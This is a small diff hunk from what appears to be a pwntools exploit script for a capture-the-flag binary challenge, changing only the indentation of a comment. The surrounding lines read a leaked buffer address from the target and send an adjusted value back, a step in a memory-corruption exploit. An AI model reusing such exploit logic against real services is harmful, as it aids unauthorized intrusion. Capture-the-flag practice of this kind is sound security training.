@@ -71,7 +71,7 @@ def pwn():
     leak = int(io.recvline()[:-1], 16)
     log.info(f"buf leak: {hex(leak)}")
 	
-	# Send leak
+    # Send leak
     io.sendlineafter(": ", str(leak+1))
     io.sendlineafter(": ", "")
     
